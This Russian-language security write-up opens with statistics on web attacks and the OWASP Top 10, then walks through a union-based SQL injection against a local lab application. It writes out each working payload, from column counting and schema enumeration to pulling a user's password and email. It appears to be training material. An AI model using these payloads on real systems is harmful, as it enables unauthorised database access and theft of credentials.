# Часть I

[По данным Positive Technologies](https://ptsecurity.com/research/analytics/aktualnye-kiberugrozy-iii-kvartal-2024-goda/) за Q3 2024, эксплуатация уязвимостей использовалась в 33% успешных атак на организации. За Q4 2024 – Q1 2025 цифра похожая: 31%.

[Verizon DBIR 2025](https://www.verizon.com/business/resources/reports/dbir/) покрывает 22 тыс. инцидентов. Базовые атаки на веб-приложения составили 12% всех утечек. Эксплуатация уязвимостей как начальный вектор: 20%, рост 34% за год. [Edgescan](https://www.edgescan.com/inside-the-2025-verizon-dbir/) уточняет, что 42% всех эксплойтов были направлены на веб-приложения. SQL Injection держится на первом месте среди веб-уязвимостей с 2022 года.

[OWASP Top 10:2025](https://owasp.org/Top10/2025/) (актуальный рейтинг):

1. Broken Access Control
2. SSRF
3. Software Supply Chain Failures
4. Cryptographic Failures
5. Injection (SQLi, XSS и др.)
6. Insecure Design
7. Security Misconfiguration
8. Vulnerable and Outdated Components
9. Identity and Authentication Failures
10. Mishandling of Exceptional Conditions

Инъекции были на 3-м месте, сейчас на 5-м. При этом SQL Injection всё ещё самая частая веб-уязвимость по Verizon.

# Часть II

`http://localhost:8080/task/?id=1` выдаёт `Ваш id:1, Ваш логин:admin`

`http://localhost:8080/task/?id=2` выдаёт `Ваш id:2, Ваш логин:Volk`

`http://localhost:8080/task/?id=1'` ломает запрос кавычкой. MySQL отвечает ошибкой: `near ''1'' LIMIT 0,1`. Ввод не экранируется, инъекция возможна.

Определяю количество колонок через ORDER BY:

`http://localhost:8080/task/?id=1'+ORDER+BY+3--+` работает

`http://localhost:8080/task/?id=1'+ORDER+BY+4--+` даёт `Unknown column '4' in 'order clause'`, колонок 3

Пробую UNION SELECT (id=-1 чтобы оригинальный запрос вернул пустоту):

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,2,3--+` выдаёт `id:1, логин:2`. На страницу выводятся 1-я и 2-я колонки.

Таблицы в базе:

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+` результат: `emails,users`

Колонки users:

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name='users'--+` результат: `id,username,password` (+ системные USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS)

Колонки emails:

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name='emails'--+` результат: `id, email_id`

**Задание 1. Пароль Volk2:**

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,password,3+FROM+users+WHERE+username='Volk2'--+` **пароль: Wa spoiuuuuu**

**Задание 2. Почта Vinni-pukh:**

Username и email лежат в разных таблицах. Сначала нужен id. Из дампа пользователей: Vinni-pukh это id=4.

`http://localhost:8080/task/?id=-1'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+` **почта: honey_lover@otus-lab.com**
